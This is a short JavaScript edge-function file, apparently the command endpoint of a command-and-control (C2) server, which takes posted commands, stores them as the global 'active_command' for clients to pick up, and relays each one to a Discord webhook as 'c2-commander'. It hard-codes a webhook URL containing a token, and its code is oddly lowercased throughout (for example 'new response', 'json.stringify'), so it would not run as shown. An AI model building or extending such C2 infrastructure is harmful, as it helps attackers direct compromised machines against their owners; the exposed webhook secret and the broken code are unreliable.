// api/command.js
import { active_command } from './lib/state.js';

export const config = { runtime: 'edge' };

const discord_webhook_url = 'https://discord.com/api/webhooks/1516092945067933797/ti4bbfclmwmi4gcuk9_b3wiurjm5z1fwn1uj33hcn0rcqtmqjlqu0aixcadqdz7s_6or';

export default async function handler(req) {
    if (req.method !== 'post') return new response('post only', { status: 405 });

    const command = await req.json();
    object.assign(active_command, command); // update the global command

    const embed = {
        title: '🕹️ command issued',
        description: `\`\`\`json\n${json.stringify(command, null, 2)}\n\`\`\``,
        color: 3447003, // blue
        timestamp: new date().toisostring(),
    };
    fetch(discord_webhook_url, {
        method: 'post',
        headers: { 'content-type': 'application/json' },
        body: json.stringify({ username: 'c2-commander', embeds: [embed] }),
    });

    return new response(json.stringify({ message: 'command broadcasted' }), { status: 200 });
}
